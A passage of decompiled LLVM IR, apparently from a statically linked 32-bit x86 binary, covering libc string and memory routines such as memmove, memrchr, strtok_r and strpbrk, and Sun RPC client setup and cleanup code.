  %v2_806305b = phi i32 [ %v0_806303c, %entry ], [ %v2_806305b.pre, %dec_label_pc_8063058 ]
  store i32 %v2_806305b, i32* @edi, align 4
  ret i32 %v0_806305c

; uselistorder directives
  uselistorder i32 %v0_8063058, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_806305b, { 1, 0 }
  uselistorder label %dec_label_pc_8063058, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8063061 = load i32, i32* @esi, align 4
  store i32 %v0_8063061, i32* %stack_var_-8, align 4
  %v4_8063062 = ptrtoint i8* %arg1 to i32
  %v9_806306e = icmp ugt i8* %tmp3, %arg1
  %v1_8063070 = icmp eq i1 %v9_806306e, false
  br i1 %v1_8063070, label %dec_label_pc_8063078, label %dec_label_pc_8063072

dec_label_pc_8063072:                             ; preds = %entry
  %v7_8063074 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  %v8_8063074 = ptrtoint i8* %v7_8063074 to i32
  store i32 %v8_8063074, i32* @ecx, align 4
  br label %dec_label_pc_8063084

dec_label_pc_8063078:                             ; preds = %entry
  %v3_8063078 = add i32 %arg2, -1
  %v4_8063078 = add i32 %v3_8063078, %tmp
  %v5_8063078 = inttoptr i32 %v4_8063078 to i8*
  %v3_806307c = add i32 %v4_8063062, -1
  %v4_806307c = add i32 %v3_806307c, %tmp
  %v5_806307c = inttoptr i32 %v4_806307c to i8*
  %v7_8063081 = call i8* @_memcpy(i8* %v5_806307c, i8* %v5_8063078, i32 %tmp)
  %v8_8063081 = ptrtoint i8* %v7_8063081 to i32
  store i32 %v8_8063081, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8063084

dec_label_pc_8063084:                             ; preds = %dec_label_pc_8063072, %dec_label_pc_8063078
  %v2_8063084 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063084, i32* @esi, align 4
  ret i32 %v4_8063062

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063084, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8063088 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_806309b = inttoptr i32 %arg1 to i16*
  %v4_806309b = call i32 @memcpy(i16* %v3_806309b, i32 %arg2, i32 %arg3)
  %v0_80630a3 = load i32, i32* @esi, align 4
  %v2_80630a3 = add i32 %v0_80630a3, %arg3
  store i32 %v0_8063088, i32* @esi, align 4
  ret i32 %v2_80630a3
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_80630b1 = urem i32 %arg2, 256
  %v4_80630bd = sext i8 %arg1 to i32
  %v2_80630c1 = add i32 %v4_80630bd, %arg3
  %v1_80630d36 = icmp eq i32 %arg3, 0
  br i1 %v1_80630d36, label %dec_label_pc_80630db, label %dec_label_pc_80630d7

dec_label_pc_80630c5:                             ; preds = %dec_label_pc_80630d7
  %v1_80630c5 = add i32 %v0_80630c5, -1
  %v5_80630c6 = load i32, i32* @edx, align 4
  %v6_80630c6 = and i32 %v5_80630c6, -256
  %v7_80630c6 = or i32 %v6_80630c6, %v4_80630b1
  store i32 %v7_80630c6, i32* @edx, align 4
  %v1_80630ca = inttoptr i32 %v1_80630c5 to i8*
  %v2_80630ca = load i8, i8* %v1_80630ca, align 1
  %v15_80630ca = icmp eq i8 %v2_80630ca, %tmp
  br i1 %v15_80630ca, label %dec_label_pc_8063158, label %dec_label_pc_80630d2

dec_label_pc_80630d2:                             ; preds = %dec_label_pc_80630c5
  %v1_80630d2 = add i32 %v0_80630d2, -1
  %v8_80630d2 = icmp eq i32 %v1_80630d2, 0
  br i1 %v8_80630d2, label %dec_label_pc_80630db, label %dec_label_pc_80630d7

dec_label_pc_80630d7:                             ; preds = %entry, %dec_label_pc_80630d2
  %v0_80630d2 = phi i32 [ %v1_80630d2, %dec_label_pc_80630d2 ], [ %arg3, %entry ]
  %v0_80630c5 = phi i32 [ %v1_80630c5, %dec_label_pc_80630d2 ], [ %v2_80630c1, %entry ]
  %v2_80630d7 = urem i32 %v0_80630c5, 4
  %v3_80630d7 = icmp eq i32 %v2_80630d7, 0
  %v1_80630d9 = icmp eq i1 %v3_80630d7, false
  br i1 %v1_80630d9, label %dec_label_pc_80630c5, label %dec_label_pc_80630db

dec_label_pc_80630db:                             ; preds = %dec_label_pc_80630d2, %dec_label_pc_80630d7, %entry
  %v0_806313e.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80630d2 ], [ %v0_80630d2, %dec_label_pc_80630d7 ]
  %v0_80630e0 = phi i32 [ %v2_80630c1, %entry ], [ %v1_80630c5, %dec_label_pc_80630d2 ], [ %v0_80630c5, %dec_label_pc_80630d7 ]
  store i32 %v0_80630e0, i32* @ecx, align 4
  %v2_80630e4 = mul nuw nsw i32 %v4_80630b1, 256
  %v2_80630e7 = or i32 %v2_80630e4, %v4_80630b1
  %v2_80630eb = mul i32 %v2_80630e7, 65536
  %v2_80630ee = or i32 %v2_80630eb, %v2_80630e7
  %v6_806314150 = icmp ugt i32 %v0_806313e.pr, 3
  br i1 %v6_806314150, label %dec_label_pc_80630f2, label %dec_label_pc_8063143

dec_label_pc_80630f2:                             ; preds = %dec_label_pc_80630db, %dec_label_pc_806313b
  %v0_806313b52 = phi i32 [ %v1_806313b, %dec_label_pc_806313b ], [ %v0_806313e.pr, %dec_label_pc_80630db ]
  %v0_80630f251 = phi i32 [ %v1_80630f2, %dec_label_pc_806313b ], [ %v0_80630e0, %dec_label_pc_80630db ]
  %v1_80630f2 = add i32 %v0_80630f251, -4
  store i32 %v1_80630f2, i32* @ecx, align 4
  %v2_80630f7 = inttoptr i32 %v1_80630f2 to i32*
  %v3_80630f7 = load i32, i32* %v2_80630f7, align 4
  %v4_80630f7 = xor i32 %v3_80630f7, %v2_80630ee
  %v1_80630f9 = add i32 %v4_80630f7, 2130640639
  %v1_80630ff = sub i32 -1, %v4_80630f7
  %v2_8063101 = xor i32 %v1_80630f9, %v1_80630ff
  %v1_8063103 = and i32 %v2_8063101, -2130640640
  %v2_8063103 = icmp eq i32 %v1_8063103, 0
  br i1 %v2_8063103, label %dec_label_pc_806313b, label %dec_label_pc_806310b

dec_label_pc_806310b:                             ; preds = %dec_label_pc_80630f2
  %v7_806310b = or i32 %v1_8063103, %v4_80630b1
  %v1_806310f = add i32 %v0_80630f251, -1
  %v2_8063112 = inttoptr i32 %v1_806310f to i8*
  %v3_8063112 = load i8, i8* %v2_8063112, align 1
  %v16_8063112 = icmp eq i8 %v3_8063112, %tmp
  br i1 %v16_8063112, label %dec_label_pc_8063158, label %dec_label_pc_8063117

dec_label_pc_8063117:                             ; preds = %dec_label_pc_806310b
  %v1_806311b = add i32 %v0_80630f251, -2
  %v2_806311e = inttoptr i32 %v1_806311b to i8*
  %v3_806311e = load i8, i8* %v2_806311e, align 1
  %v16_806311e = icmp eq i8 %v3_806311e, %tmp
  br i1 %v16_806311e, label %dec_label_pc_8063158, label %dec_label_pc_8063123

dec_label_pc_8063123:                             ; preds = %dec_label_pc_8063117
  %v1_8063127 = add i32 %v0_80630f251, -3
  %v2_806312a = inttoptr i32 %v1_8063127 to i8*
  %v3_806312a = load i8, i8* %v2_806312a, align 1
  %v16_806312a = icmp eq i8 %v3_806312a, %tmp
  br i1 %v16_806312a, label %dec_label_pc_8063158, label %dec_label_pc_806312f

dec_label_pc_806312f:                             ; preds = %dec_label_pc_8063123
  %v1_8063133 = inttoptr i32 %v1_80630f2 to i8*
  %v2_8063133 = load i8, i8* %v1_8063133, align 1
  %v15_8063133 = icmp eq i8 %v2_8063133, %tmp
  %v1_8063135 = icmp eq i1 %v15_8063133, false
  br i1 %v1_8063135, label %dec_label_pc_806313b, label %dec_label_pc_8063137

dec_label_pc_8063137:                             ; preds = %dec_label_pc_806312f
  br label %dec_label_pc_8063158

dec_label_pc_806313b:                             ; preds = %dec_label_pc_806312f, %dec_label_pc_80630f2
  %v5_806314826 = phi i32 [ %v7_806310b, %dec_label_pc_806312f ], [ 0, %dec_label_pc_80630f2 ]
  %v1_806313b = add i32 %v0_806313b52, -4
  %v6_8063141 = icmp ugt i32 %v1_806313b, 3
  br i1 %v6_8063141, label %dec_label_pc_80630f2, label %dec_label_pc_8063143

dec_label_pc_8063143:                             ; preds = %dec_label_pc_806313b, %dec_label_pc_80630db
  %v5_806314825.lcssa = phi i32 [ %v4_80630b1, %dec_label_pc_80630db ], [ %v5_806314826, %dec_label_pc_806313b ]
  %v0_80630f2.lcssa = phi i32 [ %v0_80630e0, %dec_label_pc_80630db ], [ %v1_80630f2, %dec_label_pc_806313b ]
  %v0_806313b.lcssa = phi i32 [ %v0_806313e.pr, %dec_label_pc_80630db ], [ %v1_806313b, %dec_label_pc_806313b ]
  br label %dec_label_pc_8063150

dec_label_pc_8063147:                             ; preds = %dec_label_pc_8063150
  %v1_8063150 = add i32 %v0_8063150, -1
  %v1_8063147 = add i32 %v0_8063147, -1
  %v6_8063148 = and i32 %v5_8063148, -256
  %v7_8063148 = or i32 %v6_8063148, %v4_80630b1
  %v1_806314c = inttoptr i32 %v1_8063147 to i8*
  %v2_806314c = load i8, i8* %v1_806314c, align 1
  %v15_806314c = icmp eq i8 %v2_806314c, %tmp
  br i1 %v15_806314c, label %dec_label_pc_8063158, label %dec_label_pc_8063150

dec_label_pc_8063150:                             ; preds = %dec_label_pc_8063147, %dec_label_pc_8063143
  %v5_8063148 = phi i32 [ %v7_8063148, %dec_label_pc_8063147 ], [ %v5_806314825.lcssa, %dec_label_pc_8063143 ]
  %v0_8063147 = phi i32 [ %v1_8063147, %dec_label_pc_8063147 ], [ %v0_80630f2.lcssa, %dec_label_pc_8063143 ]
  %v0_8063150 = phi i32 [ %v1_8063150, %dec_label_pc_8063147 ], [ %v0_806313b.lcssa, %dec_label_pc_8063143 ]
  %v10_8063151 = icmp eq i32 %v0_8063150, 0
  %v1_8063154 = icmp eq i1 %v10_8063151, false
  br i1 %v1_8063154, label %dec_label_pc_8063147, label %dec_label_pc_8063156

dec_label_pc_8063156:                             ; preds = %dec_label_pc_8063150
  br label %dec_label_pc_8063158

dec_label_pc_8063158:                             ; preds = %dec_label_pc_80630c5, %dec_label_pc_8063123, %dec_label_pc_8063117, %dec_label_pc_806310b, %dec_label_pc_8063147, %dec_label_pc_8063137, %dec_label_pc_8063156
  %v0_806315b = phi i32 [ %v1_80630f2, %dec_label_pc_8063137 ], [ 0, %dec_label_pc_8063156 ], [ %v1_8063147, %dec_label_pc_8063147 ], [ %v1_8063127, %dec_label_pc_8063123 ], [ %v1_806311b, %dec_label_pc_8063117 ], [ %v1_806310f, %dec_label_pc_806310b ], [ %v1_80630c5, %dec_label_pc_80630c5 ]
  ret i32 %v0_806315b

; uselistorder directives
  uselistorder i32 %v0_8063150, { 1, 0 }
  uselistorder i32 %v1_806313b, { 0, 2, 1 }
  uselistorder i32 %v1_80630f2, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_80630f251, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80630e7, { 1, 0 }
  uselistorder i32 %v0_80630c5, { 1, 0, 2 }
  uselistorder i32 %v2_80630c1, { 1, 0 }
  uselistorder i32 %v4_80630b1, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 3, 7, 0, 13, 14, 1, 12, 17, 16, 4, 6, 5, 23, 2, 8, 9, 10, 15, 18, 19, 20, 21, 22, 11 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063158, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80630f2, { 1, 0 }
  uselistorder label %dec_label_pc_80630db, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80630d7, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_806315c = load i32, i32* @edi, align 4
  %v0_806315d = load i32, i32* @esi, align 4
  %v0_806315e = load i32, i32* @ebx, align 4
  store i32 %v0_806315e, i32* %stack_var_-12, align 4
  %v4_806315f = ptrtoint i8* %arg1 to i32
  store i32 %v4_806315f, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_806316b = icmp eq i8* %arg1, null
  %v1_806316d = icmp eq i1 %v1_806316b, false
  br i1 %v1_806316d, label %dec_label_pc_8063171, label %dec_label_pc_806316f

dec_label_pc_806316f:                             ; preds = %entry
  %v1_806316f = inttoptr i32 %arg3 to i32*
  %v2_806316f = load i32, i32* %v1_806316f, align 4
  store i32 %v2_806316f, i32* @ebx, align 4
  br label %dec_label_pc_8063171

dec_label_pc_8063171:                             ; preds = %entry, %dec_label_pc_806316f
  %v0_8063174 = phi i32 [ %v4_806315f, %entry ], [ %v2_806316f, %dec_label_pc_806316f ]
  %v0_8063171 = load i32, i32* @ecx, align 4
  %v5_8063174 = inttoptr i32 %v0_8063174 to i8*
  %v8_8063175 = call i32 @__GI_strspn(i8* %v5_8063174, i32 %arg2, i32 %v0_8063171, i32 %v0_8063171)
  store i32 %v8_8063175, i32* %eax.global-to-local, align 4
  %v0_806317d = load i32, i32* @ebx, align 4
  %v2_806317d = add i32 %v0_806317d, %v8_8063175
  store i32 %v2_806317d, i32* @ebx, align 4
  %v1_806317f = inttoptr i32 %v2_806317d to i8*
  %v2_806317f = load i8, i8* %v1_806317f, align 1
  %v3_806317f = icmp eq i8 %v2_806317f, 0
  %v1_8063182 = icmp eq i1 %v3_806317f, false
  br i1 %v1_8063182, label %dec_label_pc_806318a, label %dec_label_pc_8063184

dec_label_pc_8063184:                             ; preds = %dec_label_pc_8063171
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8063186 = load i32, i32* @esi, align 4
  %v2_8063186 = inttoptr i32 %v1_8063186 to i32*
  store i32 %v2_806317d, i32* %v2_8063186, align 4
  %v0_80631b4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80631b1

dec_label_pc_806318a:                             ; preds = %dec_label_pc_8063171
  %v0_806318c = load i32, i32* @edi, align 4
  %v4_806318e = call i32 @__GI_strpbrk(i8* %v1_806317f, i32 %v0_806318c)
  store i32 %v4_806318e, i32* %eax.global-to-local, align 4
  %v2_8063196 = icmp eq i32 %v4_806318e, 0
  %v1_8063198 = icmp eq i1 %v2_8063196, false
  br i1 %v1_8063198, label %dec_label_pc_80631a9, label %dec_label_pc_806319a

dec_label_pc_806319a:                             ; preds = %dec_label_pc_806318a
  %v0_806319e = load i32, i32* @ebx, align 4
  %v5_806319e = inttoptr i32 %v0_806319e to i8*
  %v8_806319f = call i32 @rawmemchr(i8* %v5_806319e, i32 0, i32 %v4_806318e, i32 %v4_806318e)
  br label %dec_label_pc_80631ad

dec_label_pc_80631a9:                             ; preds = %dec_label_pc_806318a
  %v5_806318e = inttoptr i32 %v4_806318e to i8*
  store i8 0, i8* %v5_806318e, align 1
  %v2_80631ac = add i32 %v4_806318e, 1
  br label %dec_label_pc_80631ad

dec_label_pc_80631ad:                             ; preds = %dec_label_pc_806319a, %dec_label_pc_80631a9
  %storemerge = phi i32 [ %v2_80631ac, %dec_label_pc_80631a9 ], [ %v8_806319f, %dec_label_pc_806319a ]
  %v0_80631ad = phi i32 [ %v2_80631ac, %dec_label_pc_80631a9 ], [ %v8_806319f, %dec_label_pc_806319a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80631ad = load i32, i32* @esi, align 4
  %v2_80631ad = inttoptr i32 %v1_80631ad to i32*
  store i32 %v0_80631ad, i32* %v2_80631ad, align 4
  %v0_80631af = load i32, i32* @ebx, align 4
  store i32 %v0_80631af, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80631b1

dec_label_pc_80631b1:                             ; preds = %dec_label_pc_8063184, %dec_label_pc_80631ad
  %v0_80631b4 = phi i32 [ %v0_80631b4.pre, %dec_label_pc_8063184 ], [ %v0_80631af, %dec_label_pc_80631ad ]
  %v2_80631b1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80631b1, i32* @ebx, align 4
  store i32 %v0_806315d, i32* @esi, align 4
  store i32 %v0_806315c, i32* @edi, align 4
  ret i32 %v0_80631b4

; uselistorder directives
  uselistorder i32 %v4_806318e, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80631b1, { 1, 0 }
  uselistorder label %dec_label_pc_80631ad, { 1, 0 }
  uselistorder label %dec_label_pc_8063171, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80631b9 = load i32, i32* @ebx, align 4
  %v2_80631d025 = load i8, i8* %arg1, align 1
  %v4_80631d229 = icmp eq i8 %v2_80631d025, 0
  br i1 %v4_80631d229, label %dec_label_pc_80631da, label %dec_label_pc_80631d6.lr.ph

dec_label_pc_80631d6.lr.ph:                       ; preds = %entry
  %v3_80631d026 = zext i8 %v2_80631d025 to i32
  %v5_80631d027 = and i32 %v0_80631b9, -256
  %v6_80631d028 = or i32 %v3_80631d026, %v5_80631d027
  %v4_80631be = ptrtoint i8* %arg1 to i32
  %v1_80631c913 = inttoptr i32 %arg2 to i8*
  %v4_80631c9.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80631d6

dec_label_pc_80631c4:                             ; preds = %dec_label_pc_80631d6, %dec_label_pc_80631c8
  %v6_80631c923 = phi i32 [ %v6_80631c9, %dec_label_pc_80631c8 ], [ %v6_80631c917, %dec_label_pc_80631d6 ]
  %v2_80631c922 = phi i8 [ %v2_80631c9, %dec_label_pc_80631c8 ], [ %v2_80631c914, %dec_label_pc_80631d6 ]
  %v0_80631c821 = phi i32 [ %v1_80631c8, %dec_label_pc_80631c8 ], [ %arg2, %dec_label_pc_80631d6 ]
  %v15_80631c4 = icmp eq i8 %v2_80631c922, %v2_80631d033
  br i1 %v15_80631c4, label %dec_label_pc_80631dc, label %dec_label_pc_80631c8

dec_label_pc_80631c8:                             ; preds = %dec_label_pc_80631c4
  %v1_80631c8 = add i32 %v0_80631c821, 1
  %v1_80631c9 = inttoptr i32 %v1_80631c8 to i8*
  %v2_80631c9 = load i8, i8* %v1_80631c9, align 1
  %v3_80631c9 = zext i8 %v2_80631c9 to i32
  %v5_80631c9 = and i32 %v6_80631c923, -256
  %v6_80631c9 = or i32 %v3_80631c9, %v5_80631c9
  store i32 %v6_80631c9, i32* @ecx, align 4
  %v4_80631cb = icmp eq i8 %v2_80631c9, 0
  %v1_80631cd = icmp eq i1 %v4_80631cb, false
  br i1 %v1_80631cd, label %dec_label_pc_80631c4, label %dec_label_pc_80631cf

dec_label_pc_80631cf:                             ; preds = %dec_label_pc_80631c8, %dec_label_pc_80631d6
  %v4_80631c9.pre36 = phi i32 [ %v6_80631c917, %dec_label_pc_80631d6 ], [ %v6_80631c9, %dec_label_pc_80631c8 ]
  %v1_80631cf = add i32 %v0_80631cf31, 1
  %v1_80631d0 = inttoptr i32 %v1_80631cf to i8*
  %v2_80631d0 = load i8, i8* %v1_80631d0, align 1
  %v3_80631d0 = zext i8 %v2_80631d0 to i32
  %v5_80631d0 = and i32 %v6_80631d034, -256
  %v6_80631d0 = or i32 %v3_80631d0, %v5_80631d0
  %v4_80631d2 = icmp eq i8 %v2_80631d0, 0
  br i1 %v4_80631d2, label %dec_label_pc_80631da, label %dec_label_pc_80631d6

dec_label_pc_80631d6:                             ; preds = %dec_label_pc_80631d6.lr.ph, %dec_label_pc_80631cf
  %v4_80631c9.pre = phi i32 [ %v4_80631c9.pre.pre, %dec_label_pc_80631d6.lr.ph ], [ %v4_80631c9.pre36, %dec_label_pc_80631cf ]
  %v6_80631d034 = phi i32 [ %v6_80631d028, %dec_label_pc_80631d6.lr.ph ], [ %v6_80631d0, %dec_label_pc_80631cf ]
  %v2_80631d033 = phi i8 [ %v2_80631d025, %dec_label_pc_80631d6.lr.ph ], [ %v2_80631d0, %dec_label_pc_80631cf ]
  %v0_80631cf31 = phi i32 [ %v4_80631be, %dec_label_pc_80631d6.lr.ph ], [ %v1_80631cf, %dec_label_pc_80631cf ]
  %v2_80631c914 = load i8, i8* %v1_80631c913, align 1
  %v3_80631c915 = zext i8 %v2_80631c914 to i32
  %v5_80631c916 = and i32 %v4_80631c9.pre, -256
  %v6_80631c917 = or i32 %v3_80631c915, %v5_80631c916
  store i32 %v6_80631c917, i32* @ecx, align 4
  %v4_80631cb18 = icmp eq i8 %v2_80631c914, 0
  %v1_80631cd20 = icmp eq i1 %v4_80631cb18, false
  br i1 %v1_80631cd20, label %dec_label_pc_80631c4, label %dec_label_pc_80631cf

dec_label_pc_80631da:                             ; preds = %dec_label_pc_80631cf, %entry
  br label %dec_label_pc_80631dc

dec_label_pc_80631dc:                             ; preds = %dec_label_pc_80631c4, %dec_label_pc_80631da
  %v0_80631de = phi i32 [ 0, %dec_label_pc_80631da ], [ %v0_80631cf31, %dec_label_pc_80631c4 ]
  store i32 %v0_80631b9, i32* @ebx, align 4
  ret i32 %v0_80631de

; uselistorder directives
  uselistorder i32 %v6_80631c917, { 2, 0, 1 }
  uselistorder i8 %v2_80631c914, { 1, 2, 0 }
  uselistorder i32 %v1_80631cf, { 1, 0 }
  uselistorder i32 %v6_80631c9, { 1, 2, 0 }
  uselistorder i8 %v2_80631c9, { 1, 2, 0 }
  uselistorder i32 %v1_80631c8, { 1, 0 }
  uselistorder i8 %v2_80631d025, { 0, 2, 1 }
  uselistorder i32 %v0_80631b9, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80631dc, { 1, 0 }
  uselistorder label %dec_label_pc_80631d6, { 1, 0 }
  uselistorder label %dec_label_pc_80631cf, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80631e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80631e0, i32* %stack_var_-4, align 4
  %v1_80631e4 = call i32 @__rpc_thread_variables(i32 %v0_80631e0)
  %v1_80631e9 = add i32 %v1_80631e4, 164
  %v2_80631e9 = inttoptr i32 %v1_80631e9 to i32*
  %v3_80631e9 = load i32, i32* %v2_80631e9, align 4
  store i32 %v3_80631e9, i32* @ebx, align 4
  %v1_80631ef = icmp eq i32 %v3_80631e9, 0
  br i1 %v1_80631ef, label %dec_label_pc_8063212, label %dec_label_pc_80631f3

dec_label_pc_80631f3:                             ; preds = %entry
  %v1_80631f3 = inttoptr i32 %v3_80631e9 to i32*
  %v2_80631f3 = load i32, i32* %v1_80631f3, align 4
  %v1_80631f5 = icmp eq i32 %v2_80631f3, 0
  br i1 %v1_80631f5, label %dec_label_pc_80631f3.dec_label_pc_8063206_crit_edge, label %dec_label_pc_80631f9

dec_label_pc_80631f3.dec_label_pc_8063206_crit_edge: ; preds = %dec_label_pc_80631f3
  br label %dec_label_pc_8063206

dec_label_pc_80631f9:                             ; preds = %dec_label_pc_80631f3
  %v1_80631f9 = add i32 %v2_80631f3, 4
  %v2_80631f9 = inttoptr i32 %v1_80631f9 to i32*
  %v3_80631f9 = load i32, i32* %v2_80631f9, align 4
  %v5_8063200 = add i32 %v3_80631f9, 16
  %v6_8063200 = inttoptr i32 %v5_8063200 to i32*
  %v7_8063200 = load i32, i32* %v6_8063200, align 4
  call void @__pseudo_call(i32 %v7_8063200)
  br label %dec_label_pc_8063206

dec_label_pc_8063206:                             ; preds = %dec_label_pc_80631f3.dec_label_pc_8063206_crit_edge, %dec_label_pc_80631f9
  %v1_806320a = call i32 @free(i32 %v3_80631e9)
  br label %dec_label_pc_8063212

dec_label_pc_8063212:                             ; preds = %entry, %dec_label_pc_8063206
  %v2_8063212 = load i32, i32* %stack_var_-12, align 4
  %v2_8063214 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8063214, i32* @ebx, align 4
  ret i32 %v2_8063212

; uselistorder directives
  uselistorder i32 %v3_80631e9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8063212, { 1, 0 }
  uselistorder label %dec_label_pc_8063206, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp13 = ptrtoint i32* %arg5 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806353a = load i32, i32* @edi, align 4
  %v0_806353b = load i32, i32* @esi, align 4
  %v0_806353c = load i32, i32* @ebx, align 4
  store i32 %v0_806353c, i32* %stack_var_-16, align 4
  %v2_8063542 = call i32 @malloc(i32 12)
  %v1_8063555 = add i32 %arg6, 3
  %v1_8063558 = add i32 %arg7, 3
  %v1_806355b = and i32 %v1_8063555, -4
  store i32 %v1_806355b, i32* @edi, align 4
  %v1_806355e = and i32 %v1_8063558, -4
  store i32 %v1_806355e, i32* @ebx, align 4
  store i32 %v2_8063542, i32* @ebp, align 4
  %v2_8063563 = add i32 %v1_806355b, 100
  %v3_8063563 = add i32 %v2_8063563, %v1_806355e
  store i32 %v3_8063563, i32* %eax.global-to-local, align 4
  %v2_806356a = call i32 @malloc(i32 %v3_8063563)
  store i32 %v2_806356a, i32* %eax.global-to-local, align 4
  %v0_8063572 = load i32, i32* @ebp, align 4
  %v1_8063572 = icmp eq i32 %v0_8063572, 0
  store i32 %v2_806356a, i32* @esi, align 4
  br i1 %v1_8063572, label %dec_label_pc_806357c, label %dec_label_pc_8063578

dec_label_pc_8063578:                             ; preds = %entry
  %v1_8063578 = icmp eq i32 %v2_806356a, 0
  %v1_806357a = icmp eq i1 %v1_8063578, false
  br i1 %v1_806357a, label %dec_label_pc_80635aa, label %dec_label_pc_806357c

dec_label_pc_806357c:                             ; preds = %entry, %dec_label_pc_8063578
  %v0_806357c = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_806357c, i32* %eax.global-to-local, align 4
  store i32 %v0_806357c, i32* @ebx, align 4
  %v0_80635851 = load i32, i32* bitcast (i8** @global_var_8074d70 to i32*), align 4
  %v4_8063590 = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_806f438.813 to i32), i32 %v0_80635851)
  store i32 %v4_8063590, i32* %eax.global-to-local, align 4
  %v0_8063598 = load i32, i32* @ebx, align 4
  %v1_8063598 = inttoptr i32 %v0_8063598 to i32*
  store i32 12, i32* %v1_8063598, align 4
  %v0_806359e = load i32, i32* @ebx, align 4
  %v1_806359e = add i32 %v0_806359e, 8
  %v2_806359e = inttoptr i32 %v1_806359e to i32*
  store i32 12, i32* %v2_806359e, align 4
  br label %dec_label_pc_8063747

dec_label_pc_80635aa:                             ; preds = %dec_label_pc_8063578
  %v1_80635aa = load i32, i32* @ebx, align 4
  %v2_80635aa = add i32 %v2_806356a, 96
  %v3_80635aa = add i32 %v2_80635aa, %v1_80635aa
  %v2_80635ae = add i32 %v2_806356a, 88
  %v3_80635ae = inttoptr i32 %v2_80635ae to i32*
  store i32 %v3_80635aa, i32* %v3_80635ae, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_80635b5 = add i32 %arg1, 2
  %v2_80635b5 = inttoptr i32 %v1_80635b5 to i16*
  %v3_80635b5 = load i16, i16* %v2_80635b5, align 2
  %v4_80635b5 = icmp eq i16 %v3_80635b5, 0
  %v1_80635ba = icmp eq i1 %v4_80635b5, false
  br i1 %v1_80635ba, label %dec_label_pc_80635e6, label %dec_label_pc_80635bc

dec_label_pc_80635bc:                             ; preds = %dec_label_pc_80635aa
  %v6_80635c7 = call i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 17)
  %v1_80635cf = urem i32 %v6_80635c7, 65536
  store i32 %v1_80635cf, i32* %eax.global-to-local, align 4
  %v1_80635d2 = icmp eq i32 %v1_80635cf, 0
  br i1 %v1_80635d2, label %dec_label_pc_8063747, label %dec_label_pc_80635da

dec_label_pc_80635da:                             ; preds = %dec_label_pc_80635bc
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_80635de = trunc i32 %v6_80635c7 to i16
  %v2_80635de = call i16 @llvm.bswap.i16(i16 %v1_80635de)
  %v3_80635de = zext i16 %v2_80635de to i32
  store i32 %v3_80635de, i32* %eax.global-to-local, align 4
  store i16 %v2_80635de, i16* %v2_80635b5, align 2
  br label %dec_label_pc_80635e6

dec_label_pc_80635e6:                             ; preds = %dec_label_pc_80635aa, %dec_label_pc_80635da
  %v0_80635e6 = load i32, i32* @ebp, align 4
  %v1_80635e6 = add i32 %v0_80635e6, 4
  %v2_80635e6 = inttoptr i32 %v1_80635e6 to i32*
